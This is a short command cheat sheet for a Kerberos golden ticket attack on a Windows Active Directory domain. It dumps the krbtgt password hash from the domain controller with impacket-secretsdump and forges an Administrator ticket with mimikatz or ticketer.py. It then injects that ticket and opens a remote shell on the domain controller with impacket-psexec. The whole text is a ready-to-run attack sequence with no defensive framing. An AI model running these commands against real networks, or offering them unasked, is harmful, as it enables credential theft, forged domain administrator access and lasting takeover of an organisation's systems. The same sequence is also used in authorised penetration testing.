# Get krbtgt hash
impacket-secretsdump -just-dc-user krbtgt domain/user:pass@$DC

# Create golden ticket
mimikatz "kerberos::golden /domain:domain.local /sid:S-1-5-21-... /krbtgt:KRBTGT_HASH /user:Administrator /ticket:golden.kirbi"

# Use the ticket
mimikatz "kerberos::ptt golden.kirbi"

# Impacket version
ticketer.py -nthash KRBTGT_HASH -domain-sid SID -domain domain.local Administrator
export KRB5CCNAME=Administrator.ccache
impacket-psexec -k -no-pass domain.local/Administrator@$DC